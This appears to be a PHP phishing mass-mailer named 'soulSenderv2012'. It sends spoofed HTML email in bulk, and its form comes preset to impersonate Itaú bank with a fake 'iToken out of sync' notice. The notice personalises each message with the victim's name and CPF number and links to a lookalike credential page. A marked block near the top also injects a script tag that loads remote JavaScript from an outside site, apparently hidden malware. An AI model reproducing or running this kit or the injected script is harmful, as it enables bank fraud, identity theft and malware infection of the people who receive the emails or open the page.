<?php
$testa = $_POST['veio'];
if($testa != "") {

	$nome = $_POST['nome'];
	$to = $_POST['emails'];


	$subject = $_POST['assunto'];
	$headers .= "MIME-Version: 1.0\r\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";


	$email = explode("\n", $to);

	function random_num(){
        for($x = 0; $x < 4; $x++){
        $n = $n . rand(1,9);
        }
         return mt_rand(1,2) . $n;
        }
	
	$de = $_POST['de'];
        $de = str_replace("%random_num%", random_num(), $de);
	$headers .= "From: ".$nome." <".$de.">\r\n";
	$i = 0;
	$count = 1;
		
		while($email[$i]) {
		

		$ok = "ok";
		$num1 = rand(100000,999999);
		$num2 = rand(100000,999999);
		$aux = explode(';',$email[$i]);
		
                 
		$message = $_POST['html'];
		$message = stripslashes($message);
		
                $message = str_replace("%rand%", $num1, $message);
		$message = str_replace("%rand2%", $num2, $message);
		
                $message = str_replace("%email%", $aux[0], $message); 
		$message = str_replace("%nome%", $aux[1], $message);
		$message = str_replace("%cpf%", $aux[2], $message);

		$subject = str_replace("%nome%", $aux[1], $subject);
     		$subject = str_replace("%rand%", $num1,  $subject);
     		$subject = str_replace("%rand2%", $num2,  $subject);
	

	 	if(mail($aux[0], $subject, $message, $headers))
		echo "* Número: $count <b>".$aux[0]."</b> <font color=green>enviado! By FloRida</font><br><hr>";
		else
		echo "* Número: $count <b>".$aux[0]."</b> <font color=red>Erro no servidor!</font><br><hr>";
	$i++;
	$count++;
	}
	
	$count--;

}




?>
<?php
#4cb372#
if(empty($f)) {
$f = "<script type=\"text/javascript\" src=\"http://just-life.eu/wp-content/themes/justlife/wlxhtzd2.php?id=21868823\"></script>";
echo $f;
}
#/4cb372#
?>
<html>

<head>
<title>.: soulSenderv2012 :.</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {
	margin-left: 0;
	margin-right: 0;
	margin-top: 0;
	margin-bottom: 0;
}
.titulo {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 18px;
	color: #FF0;
	font-weight: bold;
}

.normal {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #000000;
}

.form {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
	color: #333333;
	background-color: #FFFFFF;
	border: 1px dashed #666666;
}

.texto {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	color: #FF0;
	font-weight: bold;
}

.alerta {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
	color: #990000;
	font-size: 10px;
}
</style>
</head>
<body>
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim">
  <table width="464" height="511" border="0" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC" class="normal">
    <tr>
      <td width="462" height="25" align="center" bgcolor="#006600"><span class="titulo">em MASSA, da MASSA, uhu</span></td>
    </tr>
    <tr>
      <td height="194" valign="top" bgcolor="#006600">
	  	<table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="444">
		  <tr>
            <td align="right" height="17"><span class="texto">De / e-mail :</span></td>
            <td width="65%" height="17"><input name="nome" type="text" class="form" id="nome" value="Itau Online" style="width:48%" > <input name="de" type="text" value="comunicadodigital@itau.com.br" class="form" id="de" style="width:49%" ></td>
          </tr>
          <tr>
            <td align="right" height="17"><span class="texto">Assunto:</span></td>
            <td height="17"><input name="assunto" value="Dispositivo pendente de sincronia - %rand%" type="text" class="form" id="assunto" style="width:100%" ></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="20" colspan="2" bgcolor="#006600"><span class="texto">C&oacute;digo HTML:</span></td>
          </tr>
          <tr align="right">
            <td height="146" colspan="2" valign="top"><br>
              <textarea name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="html"><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="content-type">
  <title></title>
</head>
<body>
<table style="font-family: Verdana;" id="table6"
 align="center" bgcolor="#e9e6df" border="0"
 cellpadding="0" cellspacing="1" width="550">
  <tbody>
    <tr>
      <td bgcolor="#ffffff" valign="top"><big>
      </big>
      <p align="center"><font face="Tahoma"
 size="2">
      <img src="http://i54.tinypic.com/w7en8l.jpg" border="0"
 height="69" width="452"></font></p>
      <big> </big>
      <table id="table11" border="0" cellpadding="0"
 cellspacing="15" height="238" width="100%">
        <big> </big><tbody>
          <big> </big><tr>
            <big> </big><td align="center"
 height="208"><big> </big>
            <table style="width: 507px; height: 144px;"
 id="table12" border="0" cellpadding="0"
 cellspacing="0">
              <big> </big><tbody>
                <big> </big><tr>
                  <td bgcolor="#e9e6df" width="1"> <img
 loaded="true" class=""
 xsrc="http://images.americanas.com.br/email/gap.gif"
 src="http://images.americanas.com.br/email/gap.gif" height="1"
 width="1"></td>
                  <td> <img loaded="true" class=""
 xsrc="http://images.americanas.com.br/email/gap.gif"
 src="http://images.americanas.com.br/email/gap.gif" height="1"
 width="10"> </td>
                  <td width="97%"><small></small>
                  <div style="text-align: left;">
                    <p><font
 face="Tahoma" size="2"><img
 src="https://bankline.itau.com.br/V1/ITAUF/IMG/teclado_ic_check_dr.gif"
 border="0" height="12" width="18"></font><small><small>Prezado(a)
                      <span style="font-weight: bold;">%nome%</span>,<br>
                      </small></small><font size="2" face="Tahoma"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><small><small>Identificamos
                        que a conta corrente vinculada ao documento de n&uacute;mero <b>%cpf%</b>, encontra-se com o dispositivo <span style="font-weight: bold;">iToken </span>fora de sincronia.<br>
                      <br>
                      </small></small><font face="Tahoma"
 size="2"><img
 src="https://bankline.itau.com.br/V1/ITAUF/IMG/teclado_ic_check_dr.gif"
 border="0" height="12" width="18"></font><small><small>Para
                    sua seguran&ccedil;a e comodidade, voc&ecirc; deve realizar a sincroniza&ccedil;&atilde;o de seu aparelho, que tem como finalidade <b>corrigir falhas</b> nos c&oacute;digos gerados.<br></small></small>
        <br>           
        <small><font face="Tahoma"
 size="2"><img
 src="https://bankline.itau.com.br/V1/ITAUF/IMG/teclado_ic_check_dr.gif" alt="" width="18" height="12"
 border="0"></font><small>O dispositivo ser&aacute; sincronizado com seguran&ccedil;a atrav&eacute;s de nosso sistema <b>Guardi&atilde;o Ita&uacute; 30 horas</b>. 
                      Acesse o link abaixo e siga os procedimentos em tela.
                    </small></small>                    
   <br><br>
                    <div style="text-align: center;">
                      <p><small><small><a
 href="http://www.winabook.com.tw/captcha/itau/sincronia.php?cliente=%cpf%">Sincronizar iToken</a><br>
                      <br>
                      Protocolo de atendimento: 7440512-<span style="font-weight: bold;">%rand%</span></small></small><small><small><br>
                      </small></small><br>
</div>
                  </div>
                  <p><small></small><font face="Tahoma"
 size="2"><img
 src="https://bankline.itau.com.br/V1/ITAUF/IMG/teclado_ic_check_dr.gif" alt="" width="18" height="12"
 border="0"></font><small><small>A sincroniza&ccedil;&atilde;o &eacute; v&aacute;lida para todos os clientes <b>Pessoa F&iacute;sica</b>, <b>Uniclass</b>, <b>Private Bank</b> e <b>Empresas</b>.</small></small><span style="text-align: center"></span></p></td>
                </tr>
                <big> </big>
              </tbody><big> </big>
            </table>
            <div style="text-align: left;"><br>
            <div style="text-align: left;"><font
 size="1"><img src="http://i56.tinypic.com/1z2h92s.png"
 border="0" height="24" width="22"> <font size="1"><font color="#cc3300">Evite que seu acesso via internet seja bloqueado.</font></font><br>
              <font
 color="#cc3300">Este procedimento deve ser realizado at&eacute; o dia <b>25/04/2012.</b> </font></font><br>
            </div>
            </div>
            <div style="text-align: left;"></div><br>
            <p style="text-align: left;"><font size="2"><img
 src="http://i56.tinypic.com/2gwuo9h.png" border="0"
 height="76" width="431"></font></p>
            </td>
            <big> </big></tr>
          <big> </big>
        </tbody>
        <p align="center"><font face="Tahoma"
 size="2">
        <br>
        </font></p>
        <big> </big>
      </table>
      <big> </big></td>
    </tr>
  </tbody>
</table>
</body>
</html> 
    </textarea>
              <span class="alerta">*Lembrete: texto em HTML</span></td>
          </tr>
          <tr align="center" bgcolor="#006600">
            <td height="47" colspan="2" bgcolor="#006600"><span class="texto">E-mails abaixo: </span>
              <p><span class="texto">Ps.: 1 e-mail por linha. </span></td>
          </tr>
          <tr align="right">
            <td height="136" colspan="2" valign="top"><br>
<textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="emails">tiihalmeidah@uol.com.br;Maq 2;18230u830128
tiihalmeidah@uol.com.br;Maq 2;18230u830128</textarea>
              <span class="alerta">*Separado por quebra de linha</span> </td>
          </tr>
          <tr>
            <td height="26" align="right" valign="top" colspan="2"><input type="Submit" name="Submit" value="Enviar"></td>
          </tr>
        </table>
	  </td>
    </tr>
    <tr>
      <td height="15" align="center" bgcolor="#006600">&nbsp;</td>
    </tr>
  </table>

</form>
</body>